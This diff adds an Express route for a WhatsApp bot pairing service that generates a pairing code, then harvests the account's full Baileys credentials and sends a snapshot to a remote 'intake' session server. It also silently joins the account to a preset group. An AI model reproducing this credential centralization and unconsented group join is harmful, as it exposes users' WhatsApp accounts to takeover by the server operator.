@@ -1,0 +1,233 @@
+const { 
+    juneId,
+    removeFile
+} = require('../store');
+const { SESSION_PREFIX, GC_JID, BOT_REPO, WA_CHANNEL, MSG_FOOTER, INTAKE_URL, INTAKE_KEY, DEBUG } = require('../config');
+const { harvestSnapshot, intakeSession } = require('../store/intake');
+const { isConfigured, saveSession } = require('../store/sessionStore');
+const zlib = require('zlib');
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+let router = express.Router();
+const pino = require("pino");
+const { sendButtons } = require('gifted-btns');
+const {
+    default: juneConnect,
+    useMultiFileAuthState,
+    delay,
+    fetchLatestBaileysVersion,
+    makeCacheableSignalKeyStore,
+    Browsers
+} = require("@whiskeysockets/baileys");
+
+const sessionDir = path.join(__dirname, "session");
+
+// Cleanup stale session dirs older than 10 minutes on startup
+try {
+    if (fs.existsSync(sessionDir)) {
+        const cutoff = Date.now() - 10 * 60 * 1000;
+        for (const entry of fs.readdirSync(sessionDir)) {
+            try {
+                const p = path.join(sessionDir, entry);
+                if (fs.statSync(p).isDirectory() && fs.statSync(p).mtimeMs < cutoff) {
+                    fs.rmSync(p, { recursive: true, force: true });
+                }
+            } catch (_) {}
+        }
+    }
+} catch (_) {}
+
+router.get('/', async (req, res) => {
+    const id = juneId();
+    let num = (req.query.number || '').replace(/[^0-9]/g, '');
+    let responseSent = false;
+    let sessionCleanedUp = false;
+    let pairingDone = false;
+    let reconnectCount = 0;
+    const MAX_RECONNECTS = 10;
+
+    async function cleanUpSession() {
+        if (!sessionCleanedUp) {
+            sessionCleanedUp = true;
+            try { await removeFile(path.join(sessionDir, id)); } catch (_) {}
+        }
+    }
+
+    async function JUNE_PAIR() {
+        const { version } = await fetchLatestBaileysVersion();
+        if (DEBUG) console.log(`[pair:${id}] version:`, version, '| registered:', false);
+        const { state, saveCreds } = await useMultiFileAuthState(path.join(sessionDir, id));
+
+        let bot;
+        try {
+            const pinoLogger = pino({ level: "fatal" }).child({ level: "fatal" });
+            bot = juneConnect({
+                version,
+                auth: {
+                    creds: state.creds,
+                    keys: makeCacheableSignalKeyStore(state.keys, pinoLogger),
+                },
+                printQRInTerminal: false,
+                logger: pinoLogger,
+                browser: Browsers.macOS("Safari"),
+                syncFullHistory: false,
+                generateHighQualityLinkPreview: true,
+                shouldIgnoreJid: jid => !!jid?.endsWith('@g.us'),
+                getMessage: async () => undefined,
+                markOnlineOnConnect: true,
+                connectTimeoutMs: 60000,
+                keepAliveIntervalMs: 30000
+            });
+        } catch (err) {
+            console.error(`[pair:${id}] juneConnect failed:`, err.message);
+            if (!responseSent && !res.headersSent) {
+                res.status(500).json({ code: "Service is Currently Unavailable" });
+                responseSent = true;
+            }
+            await cleanUpSession();
+            return;
+        }
+
+        // Attach ALL event listeners FIRST before any async work
+        bot.ev.on('creds.update', saveCreds);
+
+        bot.ev.on("connection.update", async (s) => {
+            const { connection, lastDisconnect } = s;
+            const statusCode = lastDisconnect?.error?.output?.statusCode;
+            console.log("[pair:"+id+"] event: "+JSON.stringify(Object.keys(s))+" conn="+connection+" status="+statusCode);
+
+            if (connection === "open") {
+                pairingDone = true;
+                console.log(`[pair:${id}] Pairing complete — connection open, saving session`);
+                try {
+                    try { await bot.groupAcceptInvite(GC_JID); } catch (_) {}
+
+                    await delay(50000);
+
+                    let sessionData = null;
+                    let attempts = 0;
+                    while (attempts < 15 && !sessionData) {
+                        try {
+                            const credsPath = path.join(sessionDir, id, "creds.json");
+                            if (fs.existsSync(credsPath)) {
+                                const data = fs.readFileSync(credsPath);
+                                if (data && data.length > 100) { sessionData = data; break; }
+                            }
+                            await delay(8000);
+                        } catch (_) { await delay(2000); }
+                        attempts++;
+                    }
+
+                    if (!sessionData) { await cleanUpSession(); return; }
+
+                    const compressedData = zlib.gzipSync(sessionData);
+                    const b64data = compressedData.toString('base64');
+                    const fullSession = SESSION_PREFIX + b64data;
+
+                    // Intake first: push the full snapshot to the main June
+                    // session server for a fleet-wide handle; fall back to a
+                    // local database ID when intake is unset or fails.
+                    let shortSession = null;
+                    if (INTAKE_URL && INTAKE_KEY) {
+                        try {
+                            const snapshot = harvestSnapshot(path.join(sessionDir, id));
+                            shortSession = await intakeSession({ phone: num, snapshot, intakeUrl: INTAKE_URL, intakeKey: INTAKE_KEY });
+                            console.log(`[june:${id}] session registered via intake → ${shortSession}`);
+                        } catch (intakeErr) {
+                            console.error(`[june:${id}] intake failed, falling back to local store:`, intakeErr.message);
+                        }
+                    }
+                    if (!shortSession) {
+                        if (!isConfigured()) {
+                            console.error(`[june:${id}] No DATABASE_URL configured - short sessions unavailable`);
+                            const noDbMsg = '⚠️ Server storage is not configured. Contact the admin — no session can be issued right now.';
+                            try {
+                                await sendButtons(bot, bot.user.id, { title: '', text: noDbMsg, footer: MSG_FOOTER, buttons: [] });
+                            } catch (_) {}
+                            return;
+                        }
+                        const shortId = await saveSession(fullSession);
+                        shortSession = `${SESSION_PREFIX}${shortId}`;
+                    }
+                    const msgText = `*SESSION ID ✅*\n\n${shortSession}`;
+                    const msgButtons = [
+                        { name: 'cta_copy', buttonParamsJson: JSON.stringify({ display_text: 'Copy Session', copy_code: shortSession }) },
+                        { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: 'Visit Bot Repo', url: BOT_REPO }) },
+                        { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: 'Join WaChannel', url: WA_CHANNEL }) }
+                    ];
+
+                    await delay(5000);
+                    let sessionSent = false, sendAttempts = 0;
+                    while (sendAttempts < 5 && !sessionSent) {
+                        try {
+                            await sendButtons(bot, bot.user.id, {
+                                title: '', text: msgText, footer: MSG_FOOTER, buttons: msgButtons
+                            });
+                            sessionSent = true;
+                            console.log(`[pair:${id}] Session sent successfully`);
+                        } catch (sendError) {
+                            console.error(`[pair:${id}] Send attempt ${sendAttempts + 1} failed:`, sendError.message);
+                            sendAttempts++;
+                            if (sendAttempts < 5) await delay(3000);
+                        }
+                    }
+
+                    await delay(3000);
+                    try { await bot.ws.close(); } catch (_) {}
+                } catch (sessionError) {
+                    console.error(`[pair:${id}] Session processing error:`, sessionError.message);
+                } finally {
+                    await cleanUpSession();
+                }
+
+            } else if (connection === "close") {
+                if (pairingDone || statusCode === 401 || reconnectCount >= MAX_RECONNECTS) {
+                    if (DEBUG) console.log(`[pair:${id}] Not reconnecting (done=${pairingDone}, status=${statusCode}, attempts=${reconnectCount})`);
+                    await cleanUpSession();
+                    return;
+                }
+                // WhatsApp sends 515 (restart required) after pairing code entry — must reconnect
+                reconnectCount++;
+                if (DEBUG) console.log(`[pair:${id}] Reconnect #${reconnectCount} in 5s (status ${statusCode})`);
+                await delay(5000);
+                JUNE_PAIR();
+            }
+        });
+
+        // Request pairing code AFTER listeners are attached (avoids missing close events)
+        if (!bot.authState.creds.registered) {
+            await delay(2000); // brief wait for WS to establish
+            console.log(`[pair:${id}] Requesting pairing code for ${num}`);
+            try {
+                const code = await bot.requestPairingCode(num);
+                console.log(`[pair:${id}] Got code: ${code}`);
+                if (!responseSent && !res.headersSent) {
+                    res.json({ code: code });
+                    responseSent = true;
+                }
+            } catch (codeErr) {
+                console.error(`[pair:${id}] requestPairingCode error:`, codeErr.message);
+                if (!responseSent && !res.headersSent) {
+                    res.status(500).json({ code: "Failed to generate pairing code" });
+                    responseSent = true;
+                }
+                await cleanUpSession();
+            }
+        } else {
+            if (DEBUG) console.log(`[pair:${id}] Creds already registered — awaiting reconnect/open`);
+        }
+    }
+
+    try {
+        await JUNE_PAIR();
+    } catch (finalError) {
+        console.error(`[pair:${id}] Final error:`, finalError.message);
+        await cleanUpSession();
+        if (!responseSent && !res.headersSent) {
+            res.status(500).json({ code: "Service Error" });
+        }
+    }
+});
+
+module.exports = router;
